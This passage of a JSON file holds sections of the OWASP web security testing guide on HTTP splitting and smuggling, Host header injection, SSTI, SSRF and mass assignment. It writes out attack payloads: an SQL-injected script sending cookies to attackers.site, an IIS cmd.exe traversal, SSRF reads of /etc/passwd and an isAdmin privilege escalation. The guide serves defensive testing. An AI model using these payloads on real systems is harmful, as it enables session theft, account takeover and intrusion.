Objectives</h3><ul><li>Identify injections that are stored and require a recall step to the stored injection.</li><li>Understand how a recall step could occur.</li><li>Set listeners or activate the recall step if possible.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>Verify the content type allowed to upload to the web application and the resultant URL for the uploaded file. Upload a file that will exploit a component in the local user workstation when viewed or downloaded by the user. Send your victim an email or other kind of alert in order to lead him/her to browse the page. The expected result is the exploit will be triggered when the user browses the resultant page or downloads and executes the file from the trusted site.</p><p>Usually, this set of examples leverages XSS attacks by exploiting a SQL-injection vulnerability. The first thing to test is whether the target site has a SQL injection vulnerability. This is described in Testing for SQL Injection . For each SQL-injection vulnerability, there is an underlying set of constraints describing the kind of queries that the attacker/pen-tester is allowed to do.</p><p>The tester then has to match the XSS attacks he has devised with the entries that he is allowed to insert.</p><p>In a similar fashion as in the previous XSS example, use a web page field vulnerable to SQL injection issues to change a value in the database that would be used by the application as input to be shown at the site without proper filtering (this would be a combination of an SQL injection and a XSS issue). For instance, let’s suppose there is a footer table at the database with all footers for the site pages, including a notice field with the legal notice that appears at the bottom of each web page. You could use the following query to inject JavaScript code to the notice field at the footer table in the database.</p><pre><code>SELECT field1 , field2 , field3 FROM table_x WHERE field2 = 'x' ; UPDATE footer SET notice = 'Copyright 1999-2030%20\n       <script>document.write( \\' <img src=\"https://attackers.site/cv.jpg? \\' +document.cookie+ \\' \"> \\' )</script>' WHERE notice = 'Copyright 1999-2030' ;</code></pre><p>Now, each user browsing the site will silently send their cookies to the attackers.site .</p><p>Some web servers present an administration interface that may allow an attacker to upload active components of her choice to the site. This could be the case with an Apache Tomcat server that doesn’t enforce strong credentials to access its Web Application Manager (or if the pen testers have been able to obtain valid credentials for the administration module by other means).</p><p>In this case, a WAR file can be uploaded and a new web application deployed at the site, which will not only allow the pen tester to execute code of her choice locally at the server, but also to plant an application at the trusted site, which the site regular users can then access (most probably with a higher degree of trust than when accessing a different site).</p><p>As should also be obvious, the ability to change web page contents at the server, via any vulnerabilities that may be exploitable at the host which will give the attacker webroot write permissions, will also be useful towards planting such an incubated attack on the web server pages (actually, this is a known infection-spread method for some web server worms).</p><p>Gray-box or white-box testing techniques will be the same as previously discussed.</p><ul><li>Examining input validation is key in mitigating against this vulnerability. If other systems in the enterprise use the same persistence layer they may have weak input validation and the data may be persisted via abackdoor.</li><li>To combat thebackdoorissue for client-side attacks, output validation must also be employed so tainted data shall be encoded prior to displaying to the client, and hence not execute.</li></ul>",
        "tools": "<h3>Tools</h3><ul><li>XSS-proxy</li><li>Zed Attack Proxy (ZAP)</li><li>Burp Suite</li><li>Metasploit</li></ul><h3>References</h3><p>Most of the references from the Cross-site scripting section are valid. As explained above, incubated attacks are executed when combining exploits such as XSS or SQL-injection attacks.</p><ul><li>CERT Advisory CA-2000-02 Malicious HTML Tags Embedded in Client Web Requests</li><li>Blackboard Academic Suite 6.2.23 +/-: Persistent cross-site scripting vulnerability</li></ul>",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-INPV-15": {
        "summary": "<h3>Summary</h3><p>This section illustrates examples of attacks that leverage specific features of the HTTP protocol, either by exploiting weaknesses of the web application or peculiarities in the way different agents interpret HTTP messages.\nThis section will analyze two different attacks that target specific HTTP headers:</p><ul><li>HTTP splitting</li><li>HTTP smuggling</li></ul><p>The first attack exploits a lack of input sanitization which allows an intruder to insert CR and LF characters into the headers of the application response and to ‘split’ that answer into two different HTTP messages. The goal of the attack can vary from a cache poisoning to cross site scripting.</p><p>In the second attack, the attacker exploits the fact that some specially crafted HTTP messages can be parsed and interpreted in different ways depending on the agent that receives them. HTTP smuggling requires some level of knowledge about the different agents that are handling the HTTP messages (web server, proxy, firewall) and therefore will be included only in the gray-box testing section.</p><h3>Test Objectives</h3><ul><li>Assess if the application is vulnerable to splitting, identifying what possible attacks are achievable.</li><li>Assess if the chain of communication is vulnerable to smuggling, identifying what possible attacks are achievable.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>Some web applications use part of the user input to generate the values of some headers of their responses. The most straightforward example is provided by redirections in which the target URL depends on some user-submitted value. Let’s say for instance that the user is asked to choose whether they prefer a standard or advanced web interface. The choice will be passed as a parameter that will be used in the response header to trigger the redirection to the corresponding page.</p><p>More specifically, if the parameter ‘interface’ has the value ‘advanced’, the application will answer with the following:</p><pre><code>HTTP / 1.1 302 Moved Temporarily Date : Sun, 03 Dec 2005 16:22:19 GMT Location : https://victim.com/main.jsp?interface=advanced <snip></code></pre><p>When receiving this message, the browser will bring the user to the page indicated in the Location header. However, if the application does not filter the user input, it will be possible to insert in the ‘interface’ parameter the sequence %0d%0a, which represents the CRLF sequence that is used to separate different lines. At this point, testers will be able to trigger a response that will be interpreted as two different responses by anybody who happens to parse it, for instance a web cache sitting between us and the application. This can be leveraged by an attacker to poison this web cache so that it will provide false content in all subsequent requests.</p><p>Let’s say that in the previous example the tester passes the following data as the interface parameter:</p><p>advanced%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2035%0d%0a%0d%0a<html>Sorry,%20System%20Down</html></p><p>The resulting answer from the vulnerable application will therefore be the following:</p><pre><code>HTTP / 1.1 302 Moved Temporarily Date : Sun, 03 Dec 2005 16:22:19 GMT Location : https://victim.com/main.jsp?interface=advanced Content-Length : 0 HTTP/1.1 200 OK\nContent-Type: text/html\nContent-Length: 35\n\n<html>Sorry,%20System%20Down</html>\n<other data></code></pre><p>The web cache will see two different responses, so if the attacker sends, immediately after the first request, a second one asking for /index.html , the web cache will match this request with the second response and cache its content, so that all subsequent requests directed to victim.com/index.html passing through that web cache will receive the “system down” message. In this way, an attacker would be able to effectively deface the site for all users using that web cache (the whole Internet, if the web cache is a reverse proxy for the web application).</p><p>Alternatively, the attacker could pass to those users a JavaScript snippet that mounts a cross site scripting attack, e.g., to steal the cookies. Note that while the vulnerability is in the application, the target here is its users. Therefore, in order to look for this vulnerability, the tester needs to identify all user controlled input that influences one or more headers in the response, and check whether they can successfully inject a CR+LF sequence in it.</p><p>The headers that are the most likely candidates for this attack are:</p><ul><li>Location</li><li>Set-Cookie</li></ul><p>It must be noted that a successful exploitation of this vulnerability in a real world scenario can be quite complex, as several factors must be taken into account:</p><p>For a more detailed discussion about this attack and other information about possible scenarios and applications, check the papers referenced at the bottom of this section.</p><p>A successful exploitation of HTTP Splitting is greatly helped by knowing some details of the web application and of the attack target. For instance, different targets can use different methods to decide when the first HTTP message ends and when the second starts. Some will use the message boundaries, as in the previous example. Other targets will assume that different messages will be carried by different packets. Others will allocate for each message a number of chunks of predetermined length: in this case, the second message will have to start exactly at the beginning of a chunk and this will require the tester to use padding between the two messages. This might cause some trouble when the vulnerable parameter is to be sent in the URL, as a very long URL is likely to be truncated or filtered. A gray-box scenario can help the attacker to find a workaround: several application servers, for instance, will allow the request to be sent using POST instead of GET.</p><p>As mentioned in the introduction, HTTP Smuggling leverages the different ways that a particularly crafted HTTP message can be parsed and interpreted by different agents (browsers, web caches, application firewalls). This relatively new kind of attack was first discovered by Chaim Linhart, Amit Klein, Ronen Heled and Steve Orrin in 2005. There are several possible applications and we will analyze one of the most spectacular: the bypass of an application firewall. Refer to the original whitepaper (linked at the bottom of this page) for more detailed information and other scenarios.</p><p>There are several products that enable a system administration to detect and block a hostile web request depending on some known malicious pattern that is embedded in the request. For example, consider the infamous, old Unicode directory traversal attack against IIS server , in which an attacker could break out the www root by issuing a request like:</p><p>https://target/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+<command_to_execute></p><p>Of course, it is quite easy to spot and filter this attack by the presence of strings like “..” and “cmd.exe” in the URL. However, IIS 5.0 is quite picky about POST requests whose body is up to 48K bytes and truncates all content that is beyond this limit when the Content-Type header is different from application/x-www-form-urlencoded. The pen-tester can leverage this by creating a very large request, structured as follows:</p><pre><code>POST /target.asp HTTP/1.1 <-- Request #1 Host: target Connection: Keep-Alive Content-Length: 49225 < CRLF > < 49152 bytes of garbage ></code></pre><pre><code>POST /target.asp HTTP/1.0 <-- Request #2 Connection: Keep-Alive Content-Length: 33 < CRLF ></code></pre><pre><code>POST /target.asp HTTP/1.0 <-- Request #3 xxxx: POST / scripts /..% c1 %1 c.. / winnt / system32 / cmd.exe ?/ c + dir HTTP /1.0 < -- Request #4 Connection: Keep-Alive < CRLF ></code></pre><p>What happens here is that the Request #1 is made of 49223 bytes, which includes also the lines of Request #2 . Therefore, a firewall (or any other agent beside IIS 5.0) will see Request #1, will fail to see Request #2 (its data will be just part of #1), will see Request #3 and miss Request #4 (because the POST will be just part of the fake header xxxx).</p><p>Now, what happens to IIS 5.0 ? It will stop parsing Request #1 right after the 49152 bytes of garbage (as it will have reached the 48K=49152 bytes limit) and will therefore parse Request #2 as a new, separate request. Request #2 claims that its content is 33 bytes, which includes everything until “xxxx: “, making IIS miss Request #3 (interpreted as part of Request #2 ) but spot Request #4 , as its POST starts right after the 33rd byte or Request #2 . It is a bit complicated, but the point is that the attack URL will not be detected by the firewall (it will be interpreted as the body of a previous request) but will be correctly parsed (and executed) by IIS.</p><p>While in the aforementioned case the technique exploits a bug of a web server, there are other scenarios in which we can leverage the different ways that different HTTP-enabled devices parse messages that are not 1005 RFC compliant. For instance, the HTTP protocol allows only one Content-Length header, but does not specify how to handle a message that has two instances of this header. Some implementations will use the first one while others will prefer the second, cleaning the way for HTTP Smuggling attacks. Another example is the use of the Content-Length header in a GET message.</p><p>Note that HTTP Smuggling does *not* exploit any vulnerability in the target web application. Therefore, it might be somewhat tricky, in a pen-test engagement, to convince the client that a countermeasure should be looked for anyway.</p><h3>References</h3><ul><li>Amit Klein, “Divide and Conquer: HTTP Response Splitting, Web Cache Poisoning Attacks, and Related Topics”</li><li>Amit Klein: “HTTP Message Splitting, Smuggling and Other Animals”</li><li>Amit Klein: “HTTP Request Smuggling - ERRATA (the IIS 48K buffer phenomenon)”</li><li>Amit Klein: “HTTP Response Smuggling”</li><li>Chaim Linhart, Amit Klein, Ronen Heled, Steve Orrin: “HTTP Request Smuggling”</li></ul>",
        "tools": "",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-INPV-16": {
        "summary": "<h3>Summary</h3><p>This section describes how to monitor all incoming/outgoing HTTP requests on both client-side or server-side. The purpose of this testing is to verify if there is unnecessary or suspicious HTTP request sending in the background.</p><p>Most of Web security testing tools (i.e. AppScan, BurpSuite, ZAP) act as HTTP Proxy. This will require changes of proxy on client-side application or browser. The testing techniques listed below is primary focused on how we can monitor HTTP requests without changes of client-side which will be more close to production usage scenario.</p><h3>Test Objectives</h3><ul><li>Monitor all incoming and outgoing HTTP requests to the Web Server to inspect any suspicious requests.</li><li>Monitor HTTP traffic without changes of end user Browser proxy or client-side application.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>There is situation that we would like to monitor all HTTP incoming requests on web server but we can’t change configuration on the browser or application client-side. In this scenario, we can setup a reverse proxy on web server end to monitor all incoming/outgoing requests on web server.</p><p>For windows platform, Fiddler Classic is recommended. It provides not only monitor but can also edit/reply the HTTP requests. Refer to this reference for how to configure Fiddler as reverse Proxy</p><p>For Linux platform, Charles Web Debugging Proxy may be used.</p><p>The testing steps:</p><p>Port forwarding is another way to allow us intercept HTTP requests without changes of client-side. You can also use Charles as a SOCKS proxy to act as port forwarding or uses of Port Forwarding tools. It will allow us to forward all coming client-side captured traffic to web server port.</p><p>The testing flow will be:</p><p>This technique monitor all the network traffic at TCP-level. TCPDump or WireShark tools can be used. However, these tools don’t allow us edit the captured traffic and send modified HTTP requests for testing. To replay the captured traffic (PCAP) packets, Ostinato can be used.</p><p>The testing steps will be:</p><p>Fiddler or Charles are recommended since these tools can capture HTTP traffic and also easily edit/reply the modified HTTP requests. In addition, if the web traffic is HTTPS, the wireshark will need to import the web server private key to inspect the HTTPS message body. Otherwise, the HTTPS message body of the captured traffic will all be encrypted.</p>",
        "tools": "<h3>Tools</h3><ul><li>Fiddler</li><li>TCPProxy</li><li>Charles Web Debugging Proxy</li><li>WireShark</li><li>PowerEdit-Pcap</li><li>pcapteller</li><li>replayproxy</li><li>Ostinato</li></ul><h3>References</h3><ul><li>Charles Web Debugging Proxy</li><li>Fiddler</li><li>TCPDUMP</li><li>Ostinato</li></ul>",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-INPV-17": {
        "summary": "<h3>Summary</h3><p>A web server commonly hosts several web applications on the same IP address, referring to each application via the virtual host. In an incoming HTTP request, web servers often dispatch the request to the target virtual host based on the value supplied in the Host header. Without proper validation of the header value, the attacker can supply invalid input to cause the web server to:</p><ul><li>Dispatch requests to the first virtual host on the list.</li><li>Perform a redirect to an attacker-controlled domain.</li><li>Perform web cache poisoning.</li><li>Manipulate password reset functionality.</li><li>Allow access to virtual hosts that were not intended to be externally accessible.</li></ul><h3>Test Objectives</h3><ul><li>Assess if the Host header is being parsed dynamically in the application.</li><li>Bypass security controls that rely on the header.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>Initial testing is as simple as supplying another domain (i.e. attacker.com ) into the Host header field. It is how the web server processes the header value that dictates the impact. The attack is valid when the web server processes the input to send the request to an attacker-controlled host that resides at the supplied domain, and not to an internal virtual host that resides on the web server.</p><pre><code>GET / HTTP / 1.1 Host : www.attacker.com [...]</code></pre><p>In the simplest case, this may cause a 302 redirect to the supplied domain.</p><pre><code>HTTP / 1.1 302 Found [...] Location : https://www.attacker.com/login.php</code></pre><p>Alternatively, the web server may send the request to the first virtual host on the list.</p><p>In the event that Host header injection is mitigated by checking for invalid input injected via the Host header, you can supply the value to the X-Forwarded-Host header.</p><pre><code>GET / HTTP / 1.1 Host : www.example.com X-Forwarded-Host : www.attacker.com [...]</code></pre><p>Potentially producing client-side output such as:</p><pre><code>[...] <link src= \"https://www.attacker.com/link\" /> [...]</code></pre><p>Once again, this depends on how the web server processes the header value.</p><p>Using this technique, an attacker can manipulate a web-cache to serve poisoned content to anyone who requests it. This relies on the ability to poison the caching proxy run by the application itself, CDNs, or other downstream providers. As a result, the victim will have no control over receiving the malicious content when requesting the vulnerable application.</p><pre><code>GET / HTTP / 1.1 Host : www.attacker.com [...]</code></pre><p>The following will be served from the web cache, when a victim visits the vulnerable application.</p><pre><code>[...] <link src= \"https://www.attacker.com/link\" /> [...]</code></pre><p>It is common for password reset functionality to include the Host header value when creating password reset links that use a generated secret token. If the application processes an attacker-controlled domain to create a password reset link, the victim may click on the link in the email and allow the attacker to obtain the reset token, thus resetting the victim’s password.</p><p>The example below shows a password reset link that is generated in PHP using the value of $_SERVER['HTTP_HOST'] , which is set based on the contents of the HTTP Host header:</p><pre><code>$reset_url = \"https://\" . $_SERVER [ 'HTTP_HOST' ] . \"/reset.php?token=\" . $token ; send_reset_email ( $email , $rset_url );</code></pre><p>By making a HTTP request to the password reset page with a tampered Host header, we can modify where the URL points:</p><pre><code>POST /request_password_reset.php HTTP / 1.1 Host : www.attacker.com [...] [email protected]</code></pre><p>The specified domain ( www.attacker.com ) will then be used in the reset link, which is emailed to the user. When the user clicks this link, the attacker can steal the token and compromise their account.</p><pre><code>... Email snippet ...\n\nClick on the following link to reset your password:\n\nhttps://www.attacker.com/reset.php?token=12345\n\n... Email snippet ...</code></pre><p>In some cases a server may have virtual hosts that are not intended to be externally accessible. This is most common with a split-horizon DNS setup (where internal and external DNS servers return different records for the same domain).</p><p>For example, an organization may have a single webserver on their internal network, which hosts both their public website (on www.example.org ) and their internal Intranet (on intranet.example.org , but that record only exists on the internal DNS server). Although it would not be possible to browse directly to intranet.example.org from outside the network (as the domain would not resolve), it may be possible to access to Intranet by making a request from outside with the following Host header:</p><pre><code>Host: intranet.example.org</code></pre><p>This could also be achieved by adding an entry for intranet.example.org to your hosts file with the public IP address of www.example.org , or by overriding DNS resolution in your testing tool.</p><h3>References</h3><ul><li>What is a Host Header Attack?</li><li>Host Header Attack</li><li>HTTP Host header attacks</li></ul>",
        "tools": "",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-INPV-18": {
        "summary": "<h3>Summary</h3><p>Web applications commonly use server-side templating technologies (Jinja2, Twig, FreeMaker, etc.) to generate dynamic HTML responses. Server-side Template Injection vulnerabilities (SSTI) occur when user input is embedded in a template in an unsafe manner and results in remote code execution on the server. Any features that support advanced user-supplied markup may be vulnerable to SSTI including wiki-pages, reviews, marketing applications, CMS systems etc. Some template engines employ various mechanisms (eg. sandbox, allow listing, etc.) to protect against SSTI.</p><p>The following example is an excerpt from the Extreme Vulnerable Web Application project.</p><pre><code>public function getFilter ( $name ) { [ snip ] foreach ( $this -> filterCallbacks as $callback ) { if ( false !== $filter = call_user_func ( $callback , $name )) { return $filter ; } } return false ; }</code></pre><p>In the getFilter function the call_user_func($callback, $name) is vulnerable to SSTI: the name parameter is fetched from the HTTP GET request and executed by the server:</p><p>Figure 4.7.18-1: SSTI XVWA Example</p><br><p>The following example uses Flask and Jinja2 templating engine. The page function accepts a ‘name’ parameter from an HTTP GET request and renders an HTML response with the name variable content:</p><pre><code>@ app . route ( \"/page\" ) def page (): name = request . values . get ( 'name' ) output = Jinja2 . from_string ( 'Hello ' + name + '!' ). render () return output</code></pre><p>This code snippet is vulnerable to XSS but it is also vulnerable to SSTI. Using the following as a payload in the name parameter:</p><pre><code>$ curl -g 'https://www.target.com/page?name=' Hello 49!</code></pre><h3>Test Objectives</h3><ul><li>Detect template injection vulnerability points.</li><li>Identify the templating engine.</li><li>Build the exploit.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>SSTI vulnerabilities exist either in text or code context. In plaintext context users allowed to use freeform ‘text’ with direct HTML code. In code context the user input may also be placed within a template statement (eg. in a variable name)</p><p>The first step in testing SSTI in plaintext context is to construct common template expressions used by various template engines as payloads and monitor server responses to identify which template expression was executed by the server.</p><p>Common template expression examples:</p><pre><code>ab\na\n{var} ${var}  <%var%> [% var %]</code></pre><p>In this step an extensive template expression test strings/payloads list is recommended.</p><p>Testing for SSTI in code context is slightly different. First, the tester constructs the request that result either blank or error server responses. In the example below the HTTP GET parameter is inserted info the variable personal_greeting in a template statement:</p><pre><code>personal_greeting=username\nHello user01</code></pre><p>Using the following payload - the server response is blank “Hello”:</p><pre><code>personal_greeting=username<tag>\nHello</code></pre><p>In the next step is to break out of the template statement and injecting HTML tag after it using the following payload</p><pre><code>personal_greeting=username}}<tag>\nHello user01 <tag></code></pre><p>Based on the information from the previous step now the tester has to identify which template engine is used by supplying various template expressions. Based on the server responses the tester deduces the template engine used. This manual approach is discussed in greater detail in this PortSwigger article. To automate the identification of the SSTI vulnerability and the templating engine various tools are available including Tplmap or the Backslash Powered Scanner Burp Suite extension .</p><p>The main goal in this step is to identify to gain further control on the server with an RCE exploit by studying the template documentation and research. Key areas of interest are:</p><ul><li>For template authorssections covering basic syntax.</li><li>Security considerationssections.</li><li>Lists of built-in methods, functions, filters, and variables.</li><li>Lists of extensions/plugins.</li></ul><p>The tester can also identify what other objects, methods and properties can be exposed by focusing on the self object. If the self object is not available and the documentation does not reveal the technical details, a brute force of the variable name is recommended. Once the object is identified the next step is to loop through the object to identify all the methods, properties and attributes that are accessible through the template engine. This could lead to other kinds of security findings including privilege escalations, information disclosure about application passwords, API keys, configurations and environment variables, etc.</p>",
        "tools": "<h3>Tools</h3><ul><li>Tplmap</li><li>Backslash Powered Scanner Burp Suite extension</li><li>Template expression test strings/payloads list</li></ul><h3>References</h3><ul><li>James Kettle: Server-Side Template Injection:RCE for the modern webapp (whitepaper)</li><li>Server-Side Template Injection</li><li>Exploring SSTI in Flask/Jinja2</li><li>Server-Side Template Injection: from detection to Remote shell</li><li>Extreme Vulnerable Web Application</li><li>Exploiting SSTI in Thymeleaf</li></ul>",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-INPV-19": {
        "summary": "<h3>Summary</h3><p>Web applications often interact with internal or external resources. While you may expect that only the intended resource will be handling the data you send, improperly handled data may create a situation where injection attacks are possible. One type of injection attack is called Server-side Request Forgery (SSRF). A successful SSRF attack can grant the attacker access to restricted actions, internal services, or internal files within the application or the organization. In some cases, it can even lead to Remote Code Execution (RCE).</p><h3>Test Objectives</h3><ul><li>Identify SSRF injection points.</li><li>Test if the injection points are exploitable.</li><li>Asses the severity of the vulnerability.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>When testing for SSRF, you attempt to make the targeted server inadvertently load or save content that could be malicious. The most common test is for local and remote file inclusion. There is also another facet to SSRF: a trust relationship that often arises where the application server is able to interact with other back-end systems that are not directly reachable by users. These back-end systems often have non-routable private IP addresses or are restricted to certain hosts. Since they are protected by the network topology, they often lack more sophisticated controls. These internal systems often contain sensitive data or functionality.</p><p>Consider the following request:</p><pre><code>GET https://example.com/page?page=about.php</code></pre><p>You can test this request with the following payloads.</p><pre><code>GET https://example.com/page?page=https://malicioussite.com/shell.php</code></pre><pre><code>GET https://example.com/page?page=http://localhost/admin</code></pre><p>Or:</p><pre><code>GET https://example.com/page?page=http://127.0.0.1/admin</code></pre><p>Use the loopback interface to access content restricted to the host only. This mechanism implies that if you have access to the host, you also have privileges to directly access the admin page.</p><p>These kind of trust relationships, where requests originating from the local machine are handled differently than ordinary requests, are often what enables SSRF to be a critical vulnerability.</p><pre><code>GET https://example.com/page?page=file:///etc/passwd</code></pre><p>All of the payloads above can apply to any type of HTTP request, and could also be injected into header and cookie values as well.</p><p>One important note on SSRF with POST requests is that the SSRF may also manifest in a blind manner, because the application may not return anything immediately. Instead, the injected data may be used in other functionality such as PDF reports, invoice or order handling, etc., which may be visible to employees or staff but not necessarily to the end user or tester.</p><p>You can find more on Blind SSRF here , or in the references section .</p><p>In some cases, a server may convert uploaded files to PDF format. Try injecting <iframe> , <img> , <base> , or <script> elements, or CSS url() functions pointing to internal services.</p><pre><code><iframe src= \"file:///etc/passwd\" width= \"400\" height= \"400\" > <iframe src= \"file:///c:/windows/win.ini\" width= \"400\" height= \"400\" ></code></pre><p>Some applications block references to localhost and 127.0.0.1 . This can be circumvented by:</p><ul><li>Using alternative IP representation that evaluate to127.0.0.1:Decimal notation:2130706433Octal notation:017700000001IP shortening:127.1</li><li>Decimal notation:2130706433</li><li>Octal notation:017700000001</li><li>IP shortening:127.1</li><li>String obfuscation</li><li>Registering your own domain that resolves to127.0.0.1</li></ul><ul><li>Decimal notation:2130706433</li><li>Octal notation:017700000001</li><li>IP shortening:127.1</li></ul><p>Sometimes the application allows input that matches a certain expression, like a domain. That can be circumvented if the URL schema parser is not properly implemented, resulting in attacks similar to semantic attacks .</p><ul><li>Using the@character to separate between the userinfo and the host:https://expected-domain@attacker-domain</li><li>URL fragmentation with the#character:https://attacker-domain#expected-domain</li><li>URL encoding</li><li>Fuzzing</li><li>Combinations of all of the above</li></ul><p>For additional payloads and bypass techniques, see the references section.</p>",
        "tools": "",
        "remediation": "<h3>Remediation</h3><p>SSRF is known to be one of the hardest attacks to defeat without the use of allow lists that require specific IPs and URLs to be allowed. For more on SSRF prevention, read the Server Side Request Forgery Prevention Cheatsheet .</p><h3>References</h3><ul><li>swisskyrepo: SSRF Payloads</li><li>Reading Internal Files Using SSRF Vulnerability</li><li>Abusing the AWS Metadata Service Using SSRF Vulnerabilities</li><li>OWASP Server Side Request Forgery Prevention Cheatsheet</li><li>Portswigger: SSRF</li><li>Portswigger: Blind SSRF</li><li>Bugcrowd Webinar: SSRF</li><li>Hackerone Blog: SSRF</li><li>Hacker101: SSRF</li><li>URI Generic Syntax</li></ul>",
        "test_objectives": ""
    },
    "WSTG-INPV-20": {
        "summary": "<h3>Summary</h3><p>Modern web applications are very often based on frameworks. Many of these web application frameworks allow automatic binding of user input (in the form of HTTP request parameters) to internal objects. This is often called autobinding.\nThis feature can be sometimes exploited to access fields that were never intended to be modified from outside leading to privilege escalation, data tampering, bypass of security mechanisms, and more.\nIn this case there is a Mass Assignment vulnerability.</p><p>Examples of sensitive properties:</p><ul><li>Permission-related properties: should only be set by privileged users (e.g.is_admin,role,approved).</li><li>Process-dependent properties: should only be set internally, after a process is completed (e.g.balance,status,email_verified)</li><li>Internal properties: should only be set internally by the application (e.g.created_at,updated_at)</li></ul><h3>Test Objectives</h3><ul><li>Identify requests that modify objects</li><li>Assess if it is possible to modify fields never intended to be modified from outside</li></ul>",
        "how-to": "<h3>How to Test</h3><p>The following is a classic example that can help to illustrate the issue.</p><p>Suppose a Java web application with a User object similar to the following:</p><pre><code>public class User { private String username ; private String password ; private String email ; private boolean isAdmin ; //Getters & Setters }</code></pre><p>To create a new User the web application implements the following view:</p><pre><code><form action= \"/createUser\" method= \"POST\" > <input name= \"username\" type= \"text\" > <input name= \"password\" type= \"text\" > <input name= \"email\" text= \"text\" > <input type= \"submit\" value= \"Create\" > </form></code></pre><p>The controller that handles the creation request (Spring provides the automatic bind with the User model):</p><pre><code>@RequestMapping ( value = \"/createUser\" , method = RequestMethod . POST ) public String createUser ( User user ) { userService . add ( user ); return \"successPage\" ; }</code></pre><p>When the form is submitted, the following request is generated by the browser:</p><pre><code>POST /createUser\n[...]\nusername=bob&password=supersecretpassword& [email protected]</code></pre><p>However, due to the autobinding, an attacker can add the isAdmin parameter to the request, which the controller will automatically bind to the model.</p><pre><code>POST /createUser\n[...]\nusername=bob&password=supersecretpassword& [email protected] &isAdmin=true</code></pre><p>The user is then created with the isAdmin property set to true , giving them administrative rights on the application.</p><p>In order to determine which part of the application is vulnerable to mass assignment, enumerate all parts of the application that accept content from the user and can potentially be mapped with a model. This includes all HTTP requests (most likely GET, POST, and PUT) that appear to allow create or update operations on the back end.\nOne of the most simple indicators for potential mass assignments is the presence of bracket syntax for input parameter names, as for example:</p><pre><code><input name= \"user[name]\" type= \"text\" ></code></pre><p>When such patterns are encountered try to add an input related to a non-exiting attribute (e.g. user[nonexistingattribute] ) and analyze the response/behavior.\nIf the application does not implement any control (e.g. list of allowed fields) it is likely that it will respond with an error (e.g. 500) due to the fact that the application does not find the attribute associated to the object. More interestingly, those errors sometimes facilitate discovery of attribute names and value data types needed to exploit the issue, without access to the source code.</p><p>Since in black-box testing the tester does not have visibility on the source code, it is necessary to find other ways in order to gather information about the attributes associated to the objects.\nAnalyze the responses received by the back end, in particular pay attention to:</p><ul><li>HTML page source code</li><li>Custom JavaScript code</li><li>API responses</li></ul><p>For example, very often, it is possible to exploit handlers that return details about an object in order to gather clues on the associated fields.\nSuppose for example a handler that returns the profile of the user (e.g. GET /profile ), this may include further attributes related to the user (in this example the isAdmin attribute looks particularly interesting).</p><pre><code>{ \"_id\" : 12345 , \"username\" : \"bob\" , \"age\" : 38 , \"email\" : \" [email protected] \" , \"isAdmin\" : false }</code></pre><p>Then try to exploit handlers that allow the modification or creation of users, adding the isAdmin attribute configured to true .</p><p>Another approach is to use wordlists in order to try to enumerate all the potential attributes. The enumeration can then be automated (e.g. via wfuzz, Burp Intruder, ZAP fuzzer, etc.). The sqlmap tool includes a common-columns.txt wordlist that can be useful to identify potential sensitive attributes.\nA small example of common interesting attribute names are the following:</p><ul><li>is_admin</li><li>is_administrator</li><li>isAdmin</li><li>isAdministrator</li><li>admin</li><li>administrator</li><li>role</li></ul><p>When multiple roles are available try to compare requests made by different user levels (pay particular attention to privileged roles). For example, if extra parameters are included in requests made by an administrative user, try those as a low privileged/anonymous user.</p><p>The impact of a mass assignment can vary depending on the context therefore, for each test input attempted in the previous phase, analyze the result and determine if it represents a vulnerability that has a realistic impact on the web application’s security.\nFor example, the modification of the id of an object can lead to application Denial of Service or privilege escalation. Another example is related to the possibility to modify the role/status of the user (e.g. role or isAdmin ) leading to vertical privilege escalation.</p><p>When the analysis is performed with a gray-box testing approach, it is possible to follow the same methodology to verify the issue. However, the greater knowledge on the application allows to more easily identify frameworks and handlers subject to mass assignment vulnerability.\nIn particular, when the source code is available, it is possible to search the input vectors more easily and accurately. During a source code review, use simple tools (such as the grep command) to search for one or more common patterns within the application code.\nAccess to the DB schema or to the source code allows also to easily identify sensitive fields.</p><p>Spring MVC allows to automatically bind user input into object. Identify the controllers that handle state-changing requests (e.g. find the occurrences of @RequestMapping ) then verify if controls are in place (both on the controller or on the involved models). Limitations on the exploitation of the mass assignment can be, for example, in the form of:</p><ul><li>list of bindable fields viasetAllowedFieldsmethod of theDataBinderclass (e.g.binder.setAllowedFields([\"username\",\"password\",\"email\"]))</li><li>list of non-bindable fields viasetDisallowedFieldsmethod of theDataBinderclass (e.g.binder.setDisallowedFields([\"isAdmin\"]))</li></ul><p>It is also advisable to pay attention to the use of the @ModelAttribute annotation that allows to specify a different name/key.</p><p>Laravel Eloquent ORM provides a create method which allows automatic assignment of attributes. However, the latest versions of Eloquent ORM provide default protection against mass assignment vulnerabilities requiring to explicitly specify allowed attributes that can be assigned automatically, through the $fillable array, or attributes that have to be protected (non-bindable), trough the $guarded array. Therefore by analyzing the models (classes that extend the Model class) it is possible to identify which attributes are allowed or denied and therefore point out potential vulnerabilities.</p><p>Model binding in ASP.NET automatically bind user inputs to object properties. This also works with complex types and it will automatically convert the input data to the properties if the properties’ names match with the input.\nIdentify the controllers then verify if controls are in place (both inside the controller or in the involved models). Limitations on the exploitation of the mass assignment can be, for example, in the form of:</p><ul><li>fields declared asReadOnly</li><li>list of bindable fields viaBindattribute (e.g.[Bind(Include = \"FirstName, LastName\")] Student std), viaincludeProperties(e.g.includeProperties: new[] { \"FirstName, LastName\" }) or throughTryUpdateModel</li><li>list of non-bindable fields viaBindattribute (e.g.[Bind(Exclude = \"Status\")] Student std) or viaexcludeProperties(e.g.excludeProperties: new[] { \"Status\" })</li></ul>",
        "tools": "",
